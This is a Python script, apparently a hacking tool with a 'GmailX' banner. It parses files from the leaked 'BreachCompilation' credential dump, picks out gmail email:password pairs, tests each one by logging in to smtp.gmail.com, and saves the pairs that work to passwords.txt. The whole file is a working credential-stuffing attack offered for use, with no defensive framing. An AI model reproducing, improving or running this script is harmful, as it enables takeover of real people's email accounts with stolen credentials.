import smtplib, os
import time
import sys
import GmailXBanner
from GmailXBanner import style

print(GmailXBanner.banner)


def main():
    emails = 0
    print(style.BLUE)
    print("Enter the path of one of the files found in the BreachedCompilation!")
    path_test = r"C:\Users\USER\Downloads\BreachCompilation\data\a\b"
    print(f"E.g {path_test}")
    file = input("Enter file path: ")
    file_Conc = f'{file}'
    file_to_send = "r" + file_Conc
    file_split = file_to_send.split('"')
    real_file = file_split[1]

    text = open(real_file, "rb")
    read_text = text.read().decode("ansi")
    text_split = read_text.split()
    print(style.GREEN)
    print("[+]Searching for emails...")
    for word in text_split:
        print(word)
        if "gmail" in word:
            emails = emails + 1
            word_split = word.split(":")
            email = word_split[0]
            password = word_split[-1]
            print(email)
            print(password)
            try:
                host = 'smtp.gmail.com'
                port = 587

                server = smtplib.SMTP(host, port)
                server.ehlo()
                server.starttls()
                server.login(email, password)
                print(style.BLUE)
                print("[+] Account Found Successfully : " + email + ":" "%s" % password)
                print("#" * 50)
                pswrd = open("passwords.txt", "a")
                pswrd.write(f"<------------{time.thread_time()}+'------------>\n'{email}:{password}\n")
                pswrd.close()
                CWD = os.getcwd()
                print(f"Password saved in {CWD}")

            except smtplib.SMTPAuthenticationError:
                print(f"{style.GREEN}[-] Password Incorrect : {style.BLUE}" + password)
                pass
                print(style.RED)
            except TimeoutError:
                print(style.RED)
                print("TimeOut")
                print(style.GREEN)
                pass
            except UnicodeDecodeError:
                print(style.RED)
                print("UnicodeDecodeError")
                print(style.GREEN)
                pass
            except UnicodeEncodeError:
                print(style.RED)
                print("UnicodeEncodeError")
                print(style.GREEN)
            except Exception as e:
                print(style.RED)
                print(e)
                print(style.GREEN)


        else:
            pass
    if emails < 1:
        print(style.RED)
        print("[!!!!]No emails found...")


main()
